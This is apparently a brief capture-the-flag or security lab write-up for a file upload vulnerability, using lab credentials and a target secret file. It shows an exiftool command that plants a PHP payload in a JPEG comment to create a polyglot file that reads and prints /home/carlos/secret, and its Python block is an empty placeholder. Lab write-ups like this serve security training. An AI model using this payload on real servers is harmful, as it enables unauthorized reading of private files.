Target Goal - Exploit file upload vulnerability to exfiltrate the contents of the /home/carlos/secret

Creds - wiener:peter

Analysis:

Download cat.jpg from internet
Generate file polyglot.php

Open terminal to include signature of png or jpeg file into polygot.php
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" cat.jpg -o polygot.php
```
When run the script the result is between the markers START and END!
```python
no script
```
